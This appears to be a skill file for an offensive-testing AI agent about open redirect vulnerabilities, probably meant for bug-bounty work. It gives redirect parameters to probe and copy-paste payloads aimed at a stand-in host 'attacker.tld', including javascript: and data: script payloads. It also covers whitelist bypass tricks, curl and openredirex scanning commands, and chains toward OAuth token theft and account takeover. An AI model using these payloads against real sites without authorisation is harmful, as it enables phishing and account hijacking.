# SKILL: Open Redirect

## Version: 1.0 | Domain: web | Trigger: `WEB MODE` + (open redirect) or pasted request matching this class

---

## IDENTITY IN THIS SKILL
Often dismissed as low impact, but chain-fuel: phishing, OAuth code/token theft, SSRF whitelist bypass, CSP bypass.

---

## DETECTION
Find any param that controls a redirect: `?next=`, `?return=`, `?redirect=`, `?url=`, `?goto=`, `?target=`, `?dest=`, `?continue=`, `?rurl=`, `?returnTo=`. Probe with attacker.tld and watch `Location:` header.

## EXPLOITATION
- Direct: `?next=https://attacker.tld`
- Whitelist of own domain: `?next=https://attacker.tld/path%23.target.com`
- Whitelist by string match: `?next=https://attackertarget.com.attacker.tld`
- Path validation: `?next=//attacker.tld/a` (browser interprets // as scheme-relative)
- Backslash trick: `?next=https://target.com\\@attacker.tld`

## PAYLOADS (real, copy-paste, grouped)
```
//attacker.tld
//attacker.tld/%2f..
/\\attacker.tld
//attacker.tld@target.com
https://target.com.attacker.tld
https://target.com@attacker.tld
https:attacker.tld
https://attacker.tld/.target.com
http://attacker.tld;target.com
http://attacker.tld#@target.com
http://attacker.tld?@target.com
javascript://target.com/%0aalert(1)        (XSS in redirect → DOM XSS)
data:text/html,<script>location='https://attacker.tld'</script>
```

## BYPASS TECHNIQUES
Whitelist on `target.com` not anchored: `attackertarget.com`, `target.com.attacker.tld`. Whitelist on scheme: try `\\\\attacker.tld`, `//attacker.tld`. Strip query: use `#`.

## CHAIN POTENTIAL
Open Redirect → OAuth code/token exfil (when redirect_uri loosely matched) → ATO. Open Redirect → SSRF whitelist bypass. Open Redirect → CSP `script-src` bypass via redirect chain. Phishing / malware delivery.

## TOOLS
openredirex, oralyzer, dalfox (--method redirection)

## COMMANDS
```bash
cat urls.txt | qsreplace 'https://attacker.tld' | xargs -I% curl -sk -o /dev/null -w '%{redirect_url} %{url_effective}\n' '%' | grep attacker.tld
openredirex -l urls.txt -p ~/wordlists/redirects.txt -k FUZZ -o results.txt
```

## EDGE CASES / NOT-A-BUG TRAPS
Pure same-origin redirects (in-app navigation) are not bugs. Cross-origin must be confirmed via Location header pointing offsite.

## TRIAGE ANGLE (per platform)
Chain it: redirect into login flow + steal OAuth code = P2-P3.

## SEVERITY & CVSS
Standalone: 4.0–6.0; chained: 7.5+.

## REFERENCES
PortSwigger Open Redirect • PayloadsAllTheThings/Open Redirect
